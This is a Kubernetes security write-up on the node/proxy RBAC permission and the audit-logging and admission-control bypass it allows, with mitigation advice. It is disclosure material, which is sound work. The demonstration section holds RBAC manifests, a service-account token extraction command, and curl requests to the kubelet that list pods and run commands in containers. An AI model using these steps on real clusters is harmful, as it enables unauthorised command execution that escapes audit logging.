# Node/Proxy in Kubernetes RBAC

Some work done by [Rory McCune](https://twitter.com/raesene) and [Iain Smart](https://twitter.com/smarticu5) on a less well documented area of the Kubernetes/Kubelet API and RBAC rights

## Introduction

The node/proxy right in Kubernetes RBAC allows for users with it to get access to services running on cluster nodes *via* the API server, which can have consequences for security architecture.

Additionally with relation to the kubelet, this RBAC right could allow for effective privilege escalation and bypass of security controls such as Kubernetes audit logging and admission control.

Depending on the cluster's threat model, care should be taken before granting this right, either explicitly or via the use of wildcards (e.g. cluster-admin).

## Using the API server Proxy

Based on the [API server proxy documentation](https://kubernetes.io/docs/concepts/architecture/control-plane-node-communication/#apiserver-to-nodes-pods-and-services) we can see that it's possible to get access to other services running on cluster nodes, where they use HTTP or HTTPS. This feature can also be used to proxy to pods and services, but we're focusing on the node aspect.

This could allow users to access ports which they may not be able to reach directly due to network firewalls.

As an example, by using `kubectl proxy` we can show access to the kube-proxy health port on a cluster control plane node.

This will start a proxy of the API server on localhost, port 8001
```
kubectl proxy
Starting to serve on 127.0.0.1:8001
```

We can then curl to the API server using that and access the kube-proxy API.

```
curl http://127.0.0.1:8001/api/v1/nodes/kubeadm2nodemaster:10256/proxy/healthz
{"lastUpdated": "2022-01-27 12:05:32.176657288 +0000 UTC m=+1737670.978648438","currentTime": "2022-01-27 12:05:32.176657288 +0000 UTC m=+1737670.978648438"}
```

## Using the API server proxy for Kubelet access

In general access via the node proxy is unauthenticated, however when accessing the kubelet service, this access is credentialed. This access can be used to do things that the user may not have rights to do, for example listing all pods on the node. 

This excerpt is truncated for brevity!
```
curl http://127.0.0.1:8001/api/v1/nodes/kubeadm2nodemaster:10250/proxy/pods
{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"kubernetes-dashboard-78c79f97b4-bmhwj",
```

## Node/Proxy rights to the Kubelet API service.

The Kubernetes RBAC permission used here, has effectively dual-purpose. In addition to allowing access via the API server, it also provides direct access to the Kubelet API (the [kubelet documentation](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-authentication-authorization/#kubelet-authorization) covers the rights).

In general the kubelet is only accessed by the API server *however* it also supports webhook authentication and in a standard kubeadm cluster this is configured to use the API server as the AuthN/AuthZ service.

What this means is that a user with a valid client certificate or service account token, can authenticate to the kubelet API directly.

If that account has GET and CREATE rights to the proxy sub-resource of the node object, they can effectively execute commands in every pod on that node, directly via the Kublet API *without* hitting the Kubernetes API. the GET right controls read access operations (like pod listing) and the CREATE right controls write access operations (like command execution).

## Security Architecture Considerations

This architecture has a number of consequences from a security standpoint. First up any user with node/proxy rights can access node services with a source IP of the Kubernetes API server, bypassing any firewalls that may restrict access from their client location.

More seriously, any user with node/proxy rights can bypass any security controls put in place at the Kubernetes API server level. This includes audit logging (the kubelet does not support audit logging) and admission control (which is API server only).

## Possible Recommendations

- Ensure that only trusted service accounts and users have node/proxy rights. Note that any user with cluster-admin rights will have this as part of their rights.
- Consideration should be given to firewalling the kubelet port to white-listed addresses only (typically the API server and any other service which uses direct kubelet access (e.g. prometheus)), which could mitigate the direct access, although not the access via the API server
- Additional logging (e.g. CRI, verbose kubelet logs) could be useful to audit this access.


## Demonstrating direct Kubelet access with node/proxy

Here's a set of manifests that can be used to demonstrate the issue. Create the three manifests in a cluster of your choosing (where you can reach the kubelet port at a network level)

**ServiceAccount**
```yaml=
apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: "2022-01-07T11:51:27Z"
  name: nodeproxy
  namespace: default
```

**ClusterRole**
```yaml=
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: nodeproxy
rules:
- apiGroups:
  - ""
  resources:
  - nodes
  - nodes/proxy
  verbs:
  - get
  - create
```

**ClusterRoleBinding**
```yaml=
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: nodeproxybinding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: nodeproxy
subjects:
- kind: ServiceAccount
  name: nodeproxy
  namespace: default
```

Then get the service account token and decode it (change the secret name below to match what got created in your cluster)

```shell=
kubectl get secrets nodeproxy-token-8hg5r -o jsonpath={.data.token} | base64 -d
```

Then you can use curl with that token to get the pod listing (add the token where it says TOKEN below)

```shell=
curl -k -H "Authorization: Bearer TOKEN" https://192.168.41.77:10250/pods
```

and if you want to you can execute commands in the containers with the general form below replace TOKEN with your secret value, NAMESPACE is the namespace of the pod, POD is the pod name and CONTAINER is the container name


```shell=
curl -k -H "Authorization: Bearer TOKEN" -XPOST https://192.168.41.77:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=whoami"
```

## Related Issues

There's another, related, issue with the pod proxy, that [Kinvolk found in 2019](https://kinvolk.io/blog/2019/02/abusing-kubernetes-api-server-proxying/). This essentially showed that you could use the API server proxy to send traffic to arbitrary IP address via the API server, by repeatedly changing a pod's IP addres. Testing this shows it still works today.